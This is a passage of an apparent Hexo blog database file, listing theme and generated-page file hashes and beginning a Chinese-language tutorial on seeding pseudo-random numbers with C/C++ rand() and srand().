"5a94032bc3512a10ad4328fc19ec07b819a1d687","modified":1627776229000},{"_id":"themes/NextT/layout/_third-party/math/index.njk","hash":"abf37fc55aa86702118e8fdf5bf2d389dd589aa0","modified":1627776229000},{"_id":"themes/NextT/layout/_third-party/math/katex.njk","hash":"d82c24136bbd3443b85f07f5579845833b594684","modified":1627776229000},{"_id":"themes/NextT/layout/_third-party/math/mathjax.njk","hash":"3677017fd4572b158311f5f5d870590ab25184e0","modified":1627776229000},{"_id":"themes/NextT/layout/_third-party/search/algolia-search.njk","hash":"24ed76e0c72a25ac152820c750a05826a706b6f4","modified":1627776229000},{"_id":"themes/NextT/layout/_third-party/search/localsearch.njk","hash":"3fc91aba5b17a5ae60b8e04707a7da87db4d0340","modified":1627776229000},{"_id":"themes/NextT/layout/_third-party/statistics/busuanzi-counter.njk","hash":"a4bc501da0f22f7e420f0ca47e83988ce90b1368","modified":1627776229000},{"_id":"themes/NextT/layout/_third-party/statistics/firestore.njk","hash":"d32ebe94560fa95824478ebbff531bffc47b194d","modified":1627776229000},{"_id":"themes/NextT/layout/_third-party/statistics/index.njk","hash":"568ddf7955d11d93fb5e842b403a7ac8b1b7fdb1","modified":1627776229000},{"_id":"themes/NextT/layout/_third-party/statistics/lean-analytics.njk","hash":"2446e748cdc102c78492216319ac02148db7daf6","modified":1627776229000},{"_id":"themes/NextT/layout/_third-party/tags/mermaid.njk","hash":"099e031f52fb8e47b3af5b2684737efc9e643ee7","modified":1627776229000},{"_id":"themes/NextT/layout/_third-party/tags/pdf.njk","hash":"2c81984cc4f5123103460442f6e046f5b6c97127","modified":1627776229000},{"_id":"themes/NextT/scripts/events/lib/config.js","hash":"92ab6bb3c3122980699f0613dac27a7cabfedecc","modified":1627776229000},{"_id":"themes/NextT/scripts/events/lib/highlight.js","hash":"6aec7b2c38c50989a23bfaa0d560e75c7f553e12","modified":1627776229000},{"_id":"themes/NextT/scripts/events/lib/injects.js","hash":"d987709267a1bc6e5014411e9983d7c49c102c16","modified":1627776229000},{"_id":"themes/NextT/scripts/events/lib/utils.js","hash":"b281be775b693f9bf32766c8f6ef703c72ac9b00","modified":1627776229000},{"_id":"themes/NextT/scripts/events/lib/vendors.js","hash":"13b3301aa9b613975630502d93e6ae82c5293aa8","modified":1627776229000},{"_id":"themes/NextT/scripts/filters/comment/changyan.js","hash":"aa05e6b3d613a756178b8ba06832ad27499d4c14","modified":1627776229000},{"_id":"themes/NextT/scripts/filters/comment/common.js","hash":"2486f3e0150c753e5f3af1a3665d074704b8ee2c","modified":1627776229000},{"_id":"themes/NextT/scripts/filters/comment/default-config.js","hash":"93ee5f9109dad885dc38c49bcee630c10f9dce6e","modified":1627776229000},{"_id":"themes/NextT/scripts/filters/comment/disqus.js","hash":"7f71d6b271ba65ff333d5682e7575711d368c0d2","modified":1627776229000},{"_id":"themes/NextT/scripts/filters/comment/disqusjs.js","hash":"135b87d151055eefdbc711d9e704b112b3214a84","modified":1627776229000},{"_id":"themes/NextT/scripts/filters/comment/gitalk.js","hash":"7bb7dafdd7f6bca8464b54e17e552ce7f1714195","modified":1627776229000},{"_id":"themes/NextT/scripts/filters/comment/isso.js","hash":"ff8b5b5145220a17d0ecd9508ba9bd2d3b2da47d","modified":1627776229000},{"_id":"themes/NextT/scripts/filters/comment/livere.js","hash":"5a07d8bb52bc1d51a624ca8db54be144566c306b","modified":1627776229000},{"_id":"themes/NextT/scripts/filters/comment/utterances.js","hash":"d3bded697bc32dace689d2a6dfb6eb7514169d15","modified":1627776229000},{"_id":"themes/NextT/source/css/_variables/Muse.styl","hash":"e3be898f5ebcf435a26542653a9297ff2c71aeb0","modified":1627776229000},{"_id":"themes/NextT/source/css/_variables/Gemini.styl","hash":"96e0a7c2a65ce68215e17e369085b2ea2f1334f2","modified":1627776229000},{"_id":"themes/NextT/source/css/_variables/base.styl","hash":"32a1b73944561655087d80f025208a84e012b3cf","modified":1627776229000},{"_id":"themes/NextT/source/css/_variables/Mist.styl","hash":"e1fbf169b9b6a194b518240cbd06ec3c48b83d61","modified":1627776229000},{"_id":"themes/NextT/source/js/schemes/muse.js","hash":"62f4638674c92dfb72454fee38751d0227d3d225","modified":1627776229000},{"_id":"themes/NextT/source/js/third-party/nprogress.js","hash":"7d56b18a2bdece5468470c70c5f3eb79d4120964","modified":1627776229000},{"_id":"themes/NextT/source/css/_variables/Pisces.styl","hash":"c65536a128b9bc9dbe2fbb1b235a3cded2891002","modified":1627776229000},{"_id":"themes/NextT/source/js/third-party/rating.js","hash":"4e92c2d107ba47b47826829f9668030d5ea9bfb8","modified":1627776229000},{"_id":"themes/NextT/source/js/third-party/quicklink.js","hash":"6f58cd7aa8f6f1ab92d5a96551add293f4e55312","modified":1627776229000},{"_id":"themes/NextT/source/css/_schemes/Gemini/index.styl","hash":"fd49b521d67eaccc629f77b4e095cb7310327565","modified":1627776229000},{"_id":"themes/NextT/source/css/_schemes/Mist/_menu.styl","hash":"357b899ac0f0dfbbbebf1ea972030c7cefa463ce","modified":1627776229000},{"_id":"themes/NextT/source/css/_schemes/Mist/_header.styl","hash":"4817e77577896ab5c0da434549917ee703a3f4cf","modified":1627776229000},{"_id":"themes/NextT/source/css/_schemes/Mist/_layout.styl","hash":"5604ac1e161099a4d3e5657d53507268866dc717","modified":1627776229000},{"_id":"themes/NextT/source/css/_schemes/Mist/index.styl","hash":"ab16a3dcdc0393b9b582ef59dcc13db9320e917c","modified":1627776229000},{"_id":"themes/NextT/source/css/_schemes/Muse/_header.styl","hash":"06080fd963c904d96c00eff098a284e337953013","modified":1627776229000},{"_id":"themes/NextT/source/css/_schemes/Mist/_posts-expand.styl","hash":"b332868d76d9f1651efd65abfc0d3c9d699b1a45","modified":1627776229000},{"_id":"themes/NextT/source/css/_schemes/Muse/_layout.styl","hash":"82a29572dd90451f75358a2ee2522b87304a0bb8","modified":1627776229000},{"_id":"themes/NextT/source/css/_schemes/Muse/_menu.styl","hash":"8a70d51d8f7cd113e5fbc9f0e70c46a072f282c8","modified":1627776229000},{"_id":"themes/NextT/source/css/_schemes/Muse/_sidebar.styl","hash":"944364893bd7160d954c10ba931af641c91515a4","modified":1627776229000},{"_id":"themes/NextT/source/css/_schemes/Muse/_sub-menu.styl","hash":"c48ccd8d6651fe1a01faff8f01179456d39ba9b1","modified":1627776229000},{"_id":"themes/NextT/source/css/_schemes/Muse/index.styl","hash":"6ad168288b213cec357e9b5a97674ff2ef3a910c","modified":1627776229000},{"_id":"themes/NextT/source/css/_schemes/Pisces/_header.styl","hash":"be5c46b983df08b9dbac1b4749b1a101b54b6b50","modified":1627776229000},{"_id":"themes/NextT/source/css/_schemes/Pisces/_layout.styl","hash":"6eee86c8f0175d6c09e434053516cd8556f78d44","modified":1627776229000},{"_id":"themes/NextT/source/css/_schemes/Pisces/_sub-menu.styl","hash":"778ed2ad5643b93970c95626b325defeb586733f","modified":1627776229000},{"_id":"themes/NextT/source/css/_schemes/Pisces/_menu.styl","hash":"72dc825c50357402c342d62ab60fc0c478ab6bc1","modified":1627776229000},{"_id":"themes/NextT/source/css/_schemes/Pisces/index.styl","hash":"8000075b227749a7495eaf417cac6ccfbe441580","modified":1627776229000},{"_id":"themes/NextT/source/css/_common/components/back-to-top-sidebar.styl","hash":"d4809783ded05625675b1b4bbd9e99d7f5f7d7f9","modified":1627776229000},{"_id":"themes/NextT/source/css/_common/components/back-to-top.styl","hash":"ece860218125bdb2578f373ed4f5040c9670e4b1","modified":1627776229000},{"_id":"themes/NextT/source/css/_schemes/Pisces/_sidebar.styl","hash":"d9141e6e14a56b5952488101e9a8388c2170e270","modified":1627776229000},{"_id":"themes/NextT/source/css/_common/components/index.styl","hash":"3c7ae405dd30b9b46494a6b9a6cb1b7ec6138ba9","modified":1627776229000},{"_id":"themes/NextT/source/css/_common/components/reading-progress.styl","hash":"2a29bf3692f42f84e8f29314e0fb349f86fc727a","modified":1627776229000},{"_id":"themes/NextT/source/css/_common/outline/index.styl","hash":"0c9f72ad98807521cbdcee7b5bbe2e884311db39","modified":1627776229000},{"_id":"themes/NextT/source/css/_common/scaffolding/base.styl","hash":"2e58cb90a77d3dd16e02b8949808b4b16453828c","modified":1627776229000},{"_id":"themes/NextT/source/css/_common/scaffolding/buttons.styl","hash":"a042571d85ff7265f799004239a45f36b716b8a6","modified":1627776229000},{"_id":"themes/NextT/source/css/_common/outline/mobile.styl","hash":"aafbb3c5c20f525a92716d89ff216c3081d7b4da","modified":1627776229000},{"_id":"themes/NextT/source/css/_common/scaffolding/comments.styl","hash":"e4fecc889ba3317a64e9abba5842c79dff9b7827","modified":1627776229000},{"_id":"themes/NextT/source/css/_common/scaffolding/index.styl","hash":"523fb7b653b87ae37fc91fc8813e4ffad87b0d7e","modified":1627776229000},{"_id":"themes/NextT/source/css/_common/scaffolding/normalize.styl","hash":"b56367ea676ea8e8783ea89cd4ab150c7da7a060","modified":1627776229000},{"_id":"themes/NextT/source/css/_common/scaffolding/pagination.styl","hash":"41cba8c4c5637a6b8f1b62e67673b33676f5d734","modified":1627776229000},{"_id":"themes/NextT/source/css/_common/scaffolding/tables.styl","hash":"e840b23d33023e6d45e018f6e84b683dd56efd8d","modified":1627776229000},{"_id":"themes/NextT/source/css/_common/scaffolding/toggles.styl","hash":"572a41499391677d84b16d8dbd6a996a3d5ce041","modified":1627776229000},{"_id":"themes/NextT/source/js/third-party/analytics/baidu-analytics.js","hash":"f629acc46ff40c071ffd31b77d5c7616f0fdd778","modified":1627776229000},{"_id":"themes/NextT/source/js/third-party/analytics/growingio.js","hash":"78dd3cf04082b7dbe6246e404b2aa8e726922402","modified":1627776229000},{"_id":"themes/NextT/source/js/third-party/chat/chatra.js","hash":"c32180522788c10e51df1803aa6842ef0432ddc9","modified":1627776229000},{"_id":"themes/NextT/source/js/third-party/analytics/google-analytics.js","hash":"59684383385059dc4f8a1ff85dbbeb703bcdbcb5","modified":1627776229000},{"_id":"themes/NextT/source/js/third-party/chat/gitter.js","hash":"cc38c94125f90dadde11b5ebac7d8bf99a1a08a2","modified":1627776229000},{"_id":"themes/NextT/source/js/third-party/chat/tidio.js","hash":"b0079f6a4601e06ca6fe46e83a2f5af553e9bc3c","modified":1627776229000},{"_id":"themes/NextT/source/js/third-party/comments/disqusjs.js","hash":"b6c58f098473b526d6a3cd35655caf34b77f7cff","modified":1627776229000},{"_id":"themes/NextT/source/js/third-party/comments/changyan.js","hash":"8c8ebec444c727b704ea41ad88b0b96ed2e4b8d4","modified":1627776229000},{"_id":"themes/NextT/source/js/third-party/comments/disqus.js","hash":"e1cc671b0d524864fd445e3ab4ade9ee6d07e565","modified":1627776229000},{"_id":"themes/NextT/source/js/third-party/comments/isso.js","hash":"753a873b6f566aff5ba77ca23f91b78eb880ca64","modified":1627776229000},{"_id":"themes/NextT/source/js/third-party/comments/livere.js","hash":"2247d88c934c765c43013337860774aaa99f0b31","modified":1627776229000},{"_id":"themes/NextT/source/js/third-party/comments/utterances.js","hash":"f67f90eb03e284c82da2b8cf2f1e31801813c16d","modified":1627776229000},{"_id":"themes/NextT/source/js/third-party/comments/gitalk.js","hash":"0ec038cf83e8ec067534f16a54041e47a3c1e59a","modified":1627776229000},{"_id":"themes/NextT/source/js/third-party/math/katex.js","hash":"83c54ee536e487a1031783443fe0cb63b1b4767e","modified":1627776229000},{"_id":"themes/NextT/source/js/third-party/math/mathjax.js","hash":"9771db8b6b2541181a0e463c4bf305276d47657d","modified":1627776229000},{"_id":"themes/NextT/source/js/third-party/search/algolia-search.js","hash":"ac401e3736d56a3c9cb85ab885744cce0b813c55","modified":1627776229000},{"_id":"themes/NextT/source/js/third-party/search/local-search.js","hash":"b37f1b14aef2402d0c2d88f999ff0ce5ef6823c1","modified":1627776229000},{"_id":"themes/NextT/source/js/third-party/statistics/firestore.js","hash":"0960f16107ed61452fb0dffc6ed22dc143de34ef","modified":1627776229000},{"_id":"themes/NextT/source/js/third-party/statistics/lean-analytics.js","hash":"5a928990856b8e456f0663cf3b6b406733672e39","modified":1627776229000},{"_id":"themes/NextT/source/js/third-party/tags/pdf.js","hash":"af78c22f0e61c8c8aa8794e585e0d632c6d4fcb8","modified":1627776229000},{"_id":"themes/NextT/source/css/_common/components/pages/breadcrumb.styl","hash":"8afdc311c6b8db121758371f95cf1c5e77354f42","modified":1627776229000},{"_id":"themes/NextT/source/css/_common/components/pages/categories.styl","hash":"b6e2eb1550a7845cb2adf86081a4ab6c7bde1e68","modified":1627776229000},{"_id":"themes/NextT/source/js/third-party/tags/mermaid.js","hash":"aafb764c64f6cd5a48ad194adf65ac77078242b1","modified":1627776229000},{"_id":"themes/NextT/source/css/_common/components/pages/index.styl","hash":"7504dbc5c70262b048143b2c37d2b5aa2809afa2","modified":1627776229000},{"_id":"themes/NextT/source/css/_common/components/pages/schedule.styl","hash":"6b816c2511242ee503fb5f34cd3e4dcdafc06b85","modified":1627776229000},{"_id":"themes/NextT/source/css/_common/components/pages/tag-cloud.styl","hash":"1a81d1a71fcf0699629ce6e72dfd0a15f3a2dd0a","modified":1627776229000},{"_id":"themes/NextT/source/css/_common/components/post/index.styl","hash":"b3fa752f72ca1413289b76c56fbd33a00e3d25d7","modified":1627776229000},{"_id":"themes/NextT/source/css/_common/components/post/post-body.styl","hash":"dbac7197ebffecf4bf32f8a3cddef434f17f2ca1","modified":1627776229000},{"_id":"themes/NextT/source/css/_common/components/post/post-collapse.styl","hash":"ec37a36e94ba791663607a5022f763915778578f","modified":1627776229000},{"_id":"themes/NextT/source/css/_common/components/post/post-followme.styl","hash":"76d0dfb3a8b873a6180604ac6daecf38b6a963a2","modified":1627776229000},{"_id":"themes/NextT/source/css/_common/components/post/post-footer.styl","hash":"1d284f3ea03ba9b4feb76b375e539a8e0bccf1c3","modified":1627776229000},{"_id":"themes/NextT/source/css/_common/components/post/post-gallery.styl","hash":"aa366d37389760c8595529b850f461569577a1c5","modified":1627776229000},{"_id":"themes/NextT/source/css/_common/components/post/post-header.styl","hash":"bef7791a2e67e79f02076f2a89e1c7f95a83048c","modified":1627776229000},{"_id":"themes/NextT/source/css/_common/components/post/post-reward.styl","hash":"07cff69f2d57e6321595f64c16d8b763dc88df6a","modified":1627776229000},{"_id":"themes/NextT/source/css/_common/components/post/post-nav.styl","hash":"9ac6f477177264c26a46e8333b8456720a0444dc","modified":1627776229000},{"_id":"themes/NextT/source/css/_common/components/post/post-widgets.styl","hash":"5b5649b9749e3fd8b63aef22ceeece0a6e1df605","modified":1627776229000},{"_id":"themes/NextT/source/css/_common/components/third-party/gitalk.styl","hash":"7102f8e819b62cf7d121fd063dc663fd068feaa6","modified":1627776229000},{"_id":"themes/NextT/source/css/_common/components/third-party/index.styl","hash":"b457756758f0632767e8a560e3033059cbe4a67b","modified":1627776229000},{"_id":"themes/NextT/source/css/_common/components/third-party/math.styl","hash":"83c6588c51cd418336f4945813410a100ddfe2a4","modified":1627776229000},{"_id":"themes/NextT/source/css/_common/components/third-party/related-posts.styl","hash":"2c534d2b2dbc932ad65d335a720a7ba9612bac04","modified":1627776229000},{"_id":"themes/NextT/source/css/_common/components/third-party/utterances.styl","hash":"bf88d9c585d7b00463c46352402cfea415c29493","modified":1627776229000},{"_id":"themes/NextT/source/css/_common/outline/footer/index.styl","hash":"4f482514230c941c9475e1272188e53a54975463","modified":1627776229000},{"_id":"themes/NextT/source/css/_common/outline/header/bookmark.styl","hash":"d6d60f02b5e9f89dbfce180b3884030898022664","modified":1627776229000},{"_id":"themes/NextT/source/css/_common/components/third-party/search.styl","hash":"2896840ab8ac8ab2a7f76d18df893f290ac31625","modified":1627776229000},{"_id":"themes/NextT/source/css/_common/outline/header/index.styl","hash":"f1778d2c56974b96dae429456d5c55be325c4946","modified":1627776229000},{"_id":"themes/NextT/source/css/_common/outline/header/menu.styl","hash":"392fd53a8dd4e3f33a853ebb24290a622300e0ff","modified":1627776229000},{"_id":"themes/NextT/source/css/_common/outline/header/github-banner.styl","hash":"cf194bea1c9e67fde871a04de3bc81df72c54277","modified":1627776229000},{"_id":"themes/NextT/source/css/_common/outline/header/site-meta.styl","hash":"9a47c9045e443b8d20932f9c564a3a05fa4c6b51","modified":1627776229000},{"_id":"themes/NextT/source/css/_common/outline/header/site-nav.styl","hash":"bf3ad8b4268f763a1e26377681644887694bc009","modified":1627776229000},{"_id":"themes/NextT/source/css/_common/outline/sidebar/index.styl","hash":"eae7b83f1c711ad2ab3a41d89f517445856ffec8","modified":1627776229000},{"_id":"themes/NextT/source/css/_common/outline/sidebar/sidebar-author-links.styl","hash":"52fc98b1435129eb3edb9293ced9e507741f1350","modified":1627776229000},{"_id":"themes/NextT/source/css/_common/outline/sidebar/sidebar-author.styl","hash":"5b38ac4a0f1ade0e681aff0e3366c481d9cf3dcd","modified":1627776229000},{"_id":"themes/NextT/source/css/_common/outline/sidebar/sidebar-blogroll.styl","hash":"9950c3188a28e1c63b5498b7bdcd14b12ace3e28","modified":1627776229000},{"_id":"themes/NextT/source/css/_common/outline/sidebar/sidebar-button.styl","hash":"b926e368f702f8686aaa2eb98d3d2e533418958c","modified":1627776229000},{"_id":"themes/NextT/source/css/_common/outline/sidebar/sidebar-dimmer.styl","hash":"fbdb63c6a8887d19b7137325ba7d6806f728139c","modified":1627776229000},{"_id":"themes/NextT/source/css/_common/outline/sidebar/sidebar-nav.styl","hash":"f7ff85fe6c4efb8ff036fab2c3277b7d8bed69a8","modified":1627776229000},{"_id":"themes/NextT/source/css/_common/outline/sidebar/sidebar-toc.styl","hash":"6394340c28a21f6aa90e786f3bfe24fb26595653","modified":1627776229000},{"_id":"themes/NextT/source/css/_common/outline/sidebar/sidebar-toggle.styl","hash":"432e73bc4f99322af6af1852e0ea6e674919c31a","modified":1627776229000},{"_id":"themes/NextT/source/css/_common/outline/sidebar/site-state.styl","hash":"69eb1c282a8fd5dbab606cc09c34c5dc8e44e753","modified":1627776229000},{"_id":"themes/NextT/source/css/_common/scaffolding/highlight/index.styl","hash":"08e79881d58d01afab6dbed37ab4f52356564d7e","modified":1627776229000},{"_id":"themes/NextT/source/css/_common/scaffolding/tags/group-pictures.styl","hash":"393ff96234e4196b569d4b11496774eb78e147de","modified":1627776229000},{"_id":"themes/NextT/source/css/_common/scaffolding/tags/blockquote-center.styl","hash":"15a5e273a8137550c93c8d2a60f9fcf86e04a89e","modified":1627776229000},{"_id":"themes/NextT/source/css/_common/scaffolding/highlight/copy-code.styl","hash":"83ee4993710fc8daa1c8dbfccd5d5091fd244c30","modified":1627776229000},{"_id":"themes/NextT/source/css/_common/scaffolding/tags/index.styl","hash":"cef4e779473daa3761709958243c6b8a57bbd814","modified":1627776229000},{"_id":"themes/NextT/source/css/_common/scaffolding/tags/label.styl","hash":"debee14539272fbe3835a7d3853af2230baa3501","modified":1627776229000},{"_id":"themes/NextT/source/css/_common/scaffolding/tags/link-grid.styl","hash":"2421500e447822ef1b6826403a3e1df3345641d7","modified":1627776229000},{"_id":"themes/NextT/source/css/_common/scaffolding/tags/mermaid.styl","hash":"3c029a003e9bf747e1b9cc7c0c127f6028374876","modified":1627776229000},{"_id":"themes/NextT/source/css/_common/scaffolding/tags/note.styl","hash":"f53e6c12bd4805888f696386d00668f23cd335e7","modified":1627776229000},{"_id":"themes/NextT/source/css/_common/scaffolding/tags/pdf.styl","hash":"b49c64f8e9a6ca1c45c0ba98febf1974fdd03616","modified":1627776229000},{"_id":"themes/NextT/source/css/_common/scaffolding/tags/tabs.styl","hash":"50b00218e854200c4ec0573a841e226d49c45cba","modified":1627776229000},{"_id":"public/2021/07/07/kali_1/index.html","hash":"2ca3ee1514d22a0ef1a198d677258639ad4acae4","modified":1628876696441},{"_id":"public/2021/06/25/工具/index.html","hash":"d6b22417b7429fd6b12e01f653ede7d23c59cc31","modified":1628876696441},{"_id":"public/archives/index.html","hash":"dad8d694221e0811b0b964b963625cac355381df","modified":1628876696441},{"_id":"public/archives/page/2/index.html","hash":"cde2fe360557aef6350f5e4296e83d7c53047f27","modified":1628876696441},{"_id":"public/archives/2021/index.html","hash":"eef79af42e5b967743f0fbcf972a0670588a6741","modified":1628876696441},{"_id":"public/archives/2021/page/2/index.html","hash":"a81df89adeb59e0f5a7f2b3b3b43b180f1329811","modified":1628876696441},{"_id":"public/archives/2021/06/index.html","hash":"c7aa4c6bb14d330793e40e5a13c007ed633d8ee9","modified":1628876696441},{"_id":"public/archives/2021/06/page/2/index.html","hash":"f61a037833b6d1ee61b79f4304ba888cf43f7c70","modified":1628876696441},{"_id":"public/archives/2021/07/index.html","hash":"3dca11c7592bc96f74a24553ae68fe1d0f16dd19","modified":1628876696441},{"_id":"public/2021/06/30/ctfpwn5/index.html","hash":"0d64369eb2fb419b050a2406726b8b90f278c864","modified":1628876696441},{"_id":"public/2021/06/29/ctfpwn4/index.html","hash":"545aee38e65c923ecb822693a74d486dabe9b531","modified":1628876696441},{"_id":"public/2021/06/29/c-文件操作/index.html","hash":"1c3b6c5325d1856932312eef1aa8d11943908ffc","modified":1628876696441},{"_id":"public/2021/06/29/c-常用库函数/index.html","hash":"7f70dbc70bb5d48eb932f1f14182f802806df338","modified":1628876696441},{"_id":"public/2021/06/25/ctfpwn3/index.html","hash":"bf8be57521ed5afcf9013280c912758578ff6266","modified":1628876696441},{"_id":"public/2021/06/25/ctfpwn2/index.html","hash":"f1ec52d7e165e5538ac89717cd8dc5e5de5cb461","modified":1628876696441},{"_id":"public/2021/06/25/ctfpwn1/index.html","hash":"0a337caafe9353ead4cf598d39225f8cf6265d3a","modified":1628876696441},{"_id":"public/2021/06/24/linux1/index.html","hash":"c21996363a9a1e094aa853f16070e503c26a8dd0","modified":1628876696441},{"_id":"public/2021/06/24/py常用模块/index.html","hash":"1430eda278b7f596bdb55fde0430056e749fd434","modified":1628876696441},{"_id":"public/2021/06/22/c-rand&srand/index.html","hash":"23b929b8b0cce6a32132148605598dfb3ddf59e5","modified":1628876696441},{"_id":"public/2021/06/22/py正则表达式/index.html","hash":"dd7666cc99ac9595e6311f1abc6e122111b789d0","modified":1628876696441},{"_id":"public/index.html","hash":"7594e4ceb1f89b8e792daa6fbf679d5d3e18cc1c","modified":1628876696441},{"_id":"public/page/2/index.html","hash":"747537973db66f2bbe7ef9f494d00f2f1a23d95d","modified":1628876696441},{"_id":"public/images/favicon-16x16-next.png","hash":"943a0d67a9cdf8c198109b28f9dbd42f761d11c3","modified":1628876696441},{"_id":"public/images/apple-touch-icon-next.png","hash":"2959dbc97f31c80283e67104fe0854e2369e40aa","modified":1628876696441},{"_id":"public/images/favicon-32x32-next.png","hash":"0749d7b24b0d2fae1c8eb7f671ad4646ee1894b1","modified":1628876696441},{"_id":"public/images/avatar.gif","hash":"2dbc3e2f2d624b2ca1afe6edc2ca17307f1950c8","modified":1628876696441},{"_id":"public/images/logo.svg","hash":"2cb74fd3ea2635e015eabc58a8d488aed6cf6417","modified":1628876696441},{"_id":"public/images/logo-algolia-nebula-blue-full.svg","hash":"b85e274207b1392782476a0430feac98db1e7da0","modified":1628876696441},{"_id":"public/css/noscript.css","hash":"54d14cd43dc297950a4a8d39ec9644dd5fc3499f","modified":1628876696441},{"_id":"public/js/bookmark.js","hash":"0f563ffbf05fad30e854e413ab17ff7164ab5a53","modified":1628876696441},{"_id":"public/js/comments.js","hash":"66ae2e26ea36a41b72c638ea8b220296638ae952","modified":1628876696441},{"_id":"public/js/comments-buttons.js","hash":"1a7344440321713426a0b2ab17e276b5bdf85ade","modified":1628876696441},{"_id":"public/js/config.js","hash":"4c4ebbe3b3f3841a26f9d5af6d0ba8bc6da01c54","modified":1628876696441},{"_id":"public/js/motion.js","hash":"6d4bd07a6f8e1b4083119dca0acb5b289533b619","modified":1628876696441},{"_id":"public/js/next-boot.js","hash":"2ecaa30ec42d28ef769d875cf2d26959b8de7d24","modified":1628876696441},{"_id":"public/js/pjax.js","hash":"5bfc1cea214bd31847adc356f37df8e0b6a449df","modified":1628876696441},{"_id":"public/js/schedule.js","hash":"71d62fc3584c47ff2d4cc945226e412264399be9","modified":1628876696441},{"_id":"public/js/utils.js","hash":"cdf2a692baa5cd34104ffabced2c5ef608b62cf5","modified":1628876696441},{"_id":"public/js/schemes/muse.js","hash":"62f4638674c92dfb72454fee38751d0227d3d225","modified":1628876696441},{"_id":"public/js/third-party/quicklink.js","hash":"6f58cd7aa8f6f1ab92d5a96551add293f4e55312","modified":1628876696441},{"_id":"public/js/third-party/nprogress.js","hash":"7d56b18a2bdece5468470c70c5f3eb79d4120964","modified":1628876696441},{"_id":"public/js/third-party/rating.js","hash":"4e92c2d107ba47b47826829f9668030d5ea9bfb8","modified":1628876696441},{"_id":"public/js/third-party/analytics/baidu-analytics.js","hash":"f629acc46ff40c071ffd31b77d5c7616f0fdd778","modified":1628876696441},{"_id":"public/js/third-party/analytics/google-analytics.js","hash":"59684383385059dc4f8a1ff85dbbeb703bcdbcb5","modified":1628876696441},{"_id":"public/js/third-party/chat/chatra.js","hash":"c32180522788c10e51df1803aa6842ef0432ddc9","modified":1628876696441},{"_id":"public/js/third-party/chat/gitter.js","hash":"cc38c94125f90dadde11b5ebac7d8bf99a1a08a2","modified":1628876696441},{"_id":"public/js/third-party/chat/tidio.js","hash":"b0079f6a4601e06ca6fe46e83a2f5af553e9bc3c","modified":1628876696441},{"_id":"public/js/third-party/comments/changyan.js","hash":"8c8ebec444c727b704ea41ad88b0b96ed2e4b8d4","modified":1628876696441},{"_id":"public/js/third-party/comments/disqus.js","hash":"e1cc671b0d524864fd445e3ab4ade9ee6d07e565","modified":1628876696441},{"_id":"public/js/third-party/comments/disqusjs.js","hash":"b6c58f098473b526d6a3cd35655caf34b77f7cff","modified":1628876696441},{"_id":"public/js/third-party/analytics/growingio.js","hash":"78dd3cf04082b7dbe6246e404b2aa8e726922402","modified":1628876696441},{"_id":"public/js/third-party/comments/isso.js","hash":"753a873b6f566aff5ba77ca23f91b78eb880ca64","modified":1628876696441},{"_id":"public/js/third-party/comments/livere.js","hash":"2247d88c934c765c43013337860774aaa99f0b31","modified":1628876696441},{"_id":"public/js/third-party/math/katex.js","hash":"83c54ee536e487a1031783443fe0cb63b1b4767e","modified":1628876696441},{"_id":"public/js/third-party/comments/gitalk.js","hash":"0ec038cf83e8ec067534f16a54041e47a3c1e59a","modified":1628876696441},{"_id":"public/js/third-party/comments/utterances.js","hash":"f67f90eb03e284c82da2b8cf2f1e31801813c16d","modified":1628876696441},{"_id":"public/js/third-party/math/mathjax.js","hash":"9771db8b6b2541181a0e463c4bf305276d47657d","modified":1628876696441},{"_id":"public/js/third-party/search/algolia-search.js","hash":"ac401e3736d56a3c9cb85ab885744cce0b813c55","modified":1628876696441},{"_id":"public/js/third-party/search/local-search.js","hash":"b37f1b14aef2402d0c2d88f999ff0ce5ef6823c1","modified":1628876696441},{"_id":"public/js/third-party/statistics/firestore.js","hash":"0960f16107ed61452fb0dffc6ed22dc143de34ef","modified":1628876696441},{"_id":"public/js/third-party/statistics/lean-analytics.js","hash":"5a928990856b8e456f0663cf3b6b406733672e39","modified":1628876696441},{"_id":"public/js/third-party/tags/mermaid.js","hash":"aafb764c64f6cd5a48ad194adf65ac77078242b1","modified":1628876696441},{"_id":"public/js/third-party/tags/pdf.js","hash":"af78c22f0e61c8c8aa8794e585e0d632c6d4fcb8","modified":1628876696441},{"_id":"public/css/main.css","hash":"73c4ae50d2f4b683fe8329fc4beedbd7ac6b3cfe","modified":1628876696441}],"Category":[],"Data":[],"Page":[],"Post":[{"title":"每日学说话(●'◡'●)c-rand","_content":"\n# c--rand()与srand()\n\n### 引子\n\n​    相信大家对于rand()函数并不陌生，我们常用它来生成伪随机数，但是为什么有时候我们生成的随机数并不符合预期呢？或者说，为什么有时候我们生成的随机数并不随机？如何有效地生成伪随机数呢？\n\n### rand()\n\n    rand()函数是使用线性同余法做的，它并不是真的随机数，因为其周期特别长，所以在一定范围内可以看成随机的。\n    rand()函数不需要参数，它将会返回0到RAND_MAX之间的任意的整数。如果我们想要生成一个在区间[0, 1]之内的数，那么我们可以写出如下代码：rand_num = rand()/RAND_MAX;\n\n```c++\n#include<iostream>\nusing namespace std;\nint main() {\n\tfor (int i = 0; i < 10; i++)\n\t{\n\t\tcout << rand() << endl;\n\t}\n\treturn 0;\n\tsystem(\"pause\");\n}\n```\n\n### srand()\n\n srand()为初始化随机数发生器，用于设置rand()产生随机数时的种子。传入的参数seed为unsigned int类型，通常我们会使用time(0)或time(NULL)的返回值作为seed。下面我们来进行实验，从而对它进行更深入的感知。\n\n```c++\n#include<iostream>\nusing namespace std;\nint main() {\n\tsrand(1);\n\tfor(int i = 0; i < 10; i++)\n\t{\n    \tcout << rand() << endl;\n\t}\n\treturn 0;\n\tsystem(\"pause\");\n}\n```\n\n​\t这与我们前面不使用srand()设置随机种子时结果一致，因此我们可以看出，如果我们不显示调用srand()的话，将默认为srand(1)。此外，从这次实验中可以看出，如果我们设置某个固定的seed，那么虽然在同一次运行时，会有不同的随机数产生，但是对于这段程序的多次运行所得到的结果是不变的。\n​        那我们如何引入变化的种子呢？一般来说，我们会使用time(NULL)或time(0)来表示变化的种子，time(0)的返回的是从1970 UTC Jan 1 00:00到当前时刻的秒数，为unsigned int类型。当我们在不同时刻运行程序时，就会有不同的随机数种子，因此就可以得到不同的结果：\n\n```c++\nsrand(time(0));\nfor(int i = 0; i < 10; i++)\n{\n    cout << rand() << endl;\n}\n```\n\n​\t值得注意的是，如果，我们两次程序运行之间的间隔小于1s，那么会出现下面这种情形（我们通过在代码中两次调用srand(time(0))来模仿这种情形）：\n\n```c++\nsrand(time(0));\nfor(int i = 0; i < 10; i++)\n{\n    cout << rand() << endl;\n}\ncout << \"--------------\" << endl;\nsrand(time(0));\nfor(int i = 0; i < 10; i++)\n{\n    cout << rand() << 